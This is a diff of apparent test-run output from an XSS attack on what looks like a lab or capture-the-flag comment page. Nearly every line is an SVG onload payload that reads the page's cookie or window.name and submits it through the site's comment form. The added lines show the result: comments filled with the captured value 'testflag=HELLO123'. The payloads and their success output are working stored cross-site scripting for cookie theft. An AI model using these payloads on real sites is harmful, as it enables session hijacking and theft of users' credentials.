@@ -1,10 +1,13 @@
-lens 55 54 24 52
-box 295 (55): <svg/onload=f=forms[0];f.body.value='SCOPE';f.submit()>
-   chant: "A wild cheer erupts: <svg/onload=f=forms 0 ;f.body.value='SCOPE';f.submit()>!"
-box 296 (24): <svg/onload=name=cookie>
+lens 59 54 24 52
+box 298 (59): <svg/onload=f=forms.item(0);f.body.value=cookie;f.submit()>
+   chant: 'A wild cheer erupts: <svg/onload=f=forms.item(0);f.body.value=cookie;f.submit()>!'
+box 299 (54): <svg/onload=f=all.body;f.value=cookie;f.form.submit()>
+   chant: 'A wild cheer erupts: <svg/onload=f=all.body;f.value=cookie;f.form.submit()>!'
+box 300 (24): <svg/onload=name=cookie>
    chant: 'A wild cheer erupts: <svg/onload=name=cookie>!'
-box 297 (52): <svg/onload=f=forms[0];f.body.value=name;f.submit()>
-   chant: 'A wild cheer erupts: <svg/onload=f=forms 0 ;f.body.value=name;f.submit()>!'
-B1 comments:  <li class="muted">No comments yet.</li> 
-name after setter: '' cookie: ''
-B4 comments:  <li class="muted">No comments yet.</li> 
+box 301 (52): <svg/onload=f=all.body;f.value=name;f.form.submit()>
+   chant: 'A wild cheer erupts: <svg/onload=f=all.body;f.value=name;f.form.submit()>!'
+BA comments:  <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testfla
+BB comments:  <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testfla
+name: 'testflag=HELLO123'
+BD comments:  <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> testflag=HELLO123</li> <li><strong>@trainer01</strong> te
